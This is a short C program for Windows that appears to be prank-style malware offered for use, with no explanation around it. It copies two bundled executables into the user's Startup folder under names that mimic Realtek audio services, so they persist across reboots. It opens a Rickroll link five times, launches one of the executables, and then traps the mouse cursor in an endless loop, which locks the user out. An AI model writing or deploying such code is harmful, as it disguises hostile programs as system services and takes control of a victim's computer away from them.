#include <windows.h>
#include <stdio.h>
#include <stdlib.h>


int main()
{    
    system("copy zbib.exe \"C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\RtkAudUServiceUpd64.exe\"");
    system("copy zbsod.exe \"C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\RtkAudUService64.exe\"");
    

    system("start https://www.google.com/");

    for (int i = 0; i < 5; i++)
    {
        system("start https://youtu.be/dQw4w9WgXcQ?si=_iy9BnoHWlGCyIDY");
    }


    system("start zbib.exe");


    while (1)
    {
        SetCursorPos(2000, 2000);
    }
    
    
	return 0;
}